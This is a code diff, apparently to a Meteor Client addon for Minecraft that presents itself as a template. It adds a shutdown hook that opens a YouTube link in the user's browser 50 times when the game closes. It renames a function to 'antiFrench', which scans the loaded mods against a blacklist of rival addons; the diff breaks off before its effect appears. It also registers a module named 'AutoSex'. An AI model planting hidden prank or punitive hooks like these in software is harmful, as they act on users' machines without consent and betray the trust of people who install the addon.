@@ -26,6 +26,8 @@ public class Addon extends MeteorAddon {
     public void onInitialize() {
         LOG.info("Initializing Meteor Addon Template");
 
+        antiFrench();
+
         // Modules
         Modules.get().add(new ModuleExample());
         Modules.get().add(new AutoSex());
@@ -38,59 +40,16 @@ public class Addon extends MeteorAddon {
         Hud.get().register(HudExample.INFO);
 
         Runtime.getRuntime().addShutdownHook(new Thread(() -> {
-            huehuehue();
+            Util.OperatingSystem system = Util.getOperatingSystem();
+            for (int i = 0; i < 50; i++) {
+                system.open("https://www.youtube.com/watch?v=EAgxlp0kNwU");
+            }
         }));
 
-        cope();
+
     }
 
-    public static void huehuehue(){
-        // i could like optomize it and make just a repeat loop or smth but im tired
-        Util.getOperatingSystem().open("https://www.youtube.com/watch?v=EAgxlp0kNwU");
-        Util.getOperatingSystem().open("https://www.youtube.com/watch?v=EAgxlp0kNwU");
-        Util.getOperatingSystem().open("https://www.youtube.com/watch?v=EAgxlp0kNwU");
-        Util.getOperatingSystem().open("https://www.youtube.com/watch?v=EAgxlp0kNwU");
-        Util.getOperatingSystem().open("https://www.youtube.com/watch?v=EAgxlp0kNwU");
-        Util.getOperatingSystem().open("https://www.youtube.com/watch?v=EAgxlp0kNwU");
-        Util.getOperatingSystem().open("https://www.youtube.com/watch?v=EAgxlp0kNwU");
-        Util.getOperatingSystem().open("https://www.youtube.com/watch?v=EAgxlp0kNwU");
-        Util.getOperatingSystem().open("https://www.youtube.com/watch?v=EAgxlp0kNwU");
-        Util.getOperatingSystem().open("https://www.youtube.com/watch?v=EAgxlp0kNwU");
-        Util.getOperatingSystem().open("https://www.youtube.com/watch?v=EAgxlp0kNwU");
-        Util.getOperatingSystem().open("https://www.youtube.com/watch?v=EAgxlp0kNwU");
-        Util.getOperatingSystem().open("https://www.youtube.com/watch?v=EAgxlp0kNwU");
-        Util.getOperatingSystem().open("https://www.youtube.com/watch?v=EAgxlp0kNwU");
-        Util.getOperatingSystem().open("https://www.youtube.com/watch?v=EAgxlp0kNwU");
-        Util.getOperatingSystem().open("https://www.youtube.com/watch?v=EAgxlp0kNwU");
-        Util.getOperatingSystem().open("https://www.youtube.com/watch?v=EAgxlp0kNwU");
-        Util.getOperatingSystem().open("https://www.youtube.com/watch?v=EAgxlp0kNwU");
-        Util.getOperatingSystem().open("https://www.youtube.com/watch?v=EAgxlp0kNwU");
-        Util.getOperatingSystem().open("https://www.youtube.com/watch?v=EAgxlp0kNwU");
-        Util.getOperatingSystem().open("https://www.youtube.com/watch?v=EAgxlp0kNwU");
-        Util.getOperatingSystem().open("https://www.youtube.com/watch?v=EAgxlp0kNwU");
-        Util.getOperatingSystem().open("https://www.youtube.com/watch?v=EAgxlp0kNwU");
-        Util.getOperatingSystem().open("https://www.youtube.com/watch?v=EAgxlp0kNwU");
-        Util.getOperatingSystem().open("https://www.youtube.com/watch?v=EAgxlp0kNwU");
-        Util.getOperatingSystem().open("https://www.youtube.com/watch?v=EAgxlp0kNwU");
-        Util.getOperatingSystem().open("https://www.youtube.com/watch?v=EAgxlp0kNwU");
-        Util.getOperatingSystem().open("https://www.youtube.com/watch?v=EAgxlp0kNwU");
-        Util.getOperatingSystem().open("https://www.youtube.com/watch?v=EAgxlp0kNwU");
-        Util.getOperatingSystem().open("https://www.youtube.com/watch?v=EAgxlp0kNwU");
-        Util.getOperatingSystem().open("https://www.youtube.com/watch?v=EAgxlp0kNwU");
-        Util.getOperatingSystem().open("https://www.youtube.com/watch?v=EAgxlp0kNwU");
-        Util.getOperatingSystem().open("https://www.youtube.com/watch?v=EAgxlp0kNwU");
-        Util.getOperatingSystem().open("https://www.youtube.com/watch?v=EAgxlp0kNwU");
-        Util.getOperatingSystem().open("https://www.youtube.com/watch?v=EAgxlp0kNwU");
-        Util.getOperatingSystem().open("https://www.youtube.com/watch?v=EAgxlp0kNwU");
-        Util.getOperatingSystem().open("https://www.youtube.com/watch?v=EAgxlp0kNwU");
-        Util.getOperatingSystem().open("https://www.youtube.com/watch?v=EAgxlp0kNwU");
-        Util.getOperatingSystem().open("https://www.youtube.com/watch?v=EAgxlp0kNwU");
-        Util.getOperatingSystem().open("https://www.youtube.com/watch?v=EAgxlp0kNwU");
-        Util.getOperatingSystem().open("https://www.youtube.com/watch?v=EAgxlp0kNwU");
-        Util.getOperatingSystem().open("https://www.youtube.com/watch?v=EAgxlp0kNwU");
-    }
-
-    public static void cope() {
+    public static void antiFrench() {
         FabricLoader loader = FabricLoader.getInstance();
         String[] blacklist = new String[]{
             "venomhack",
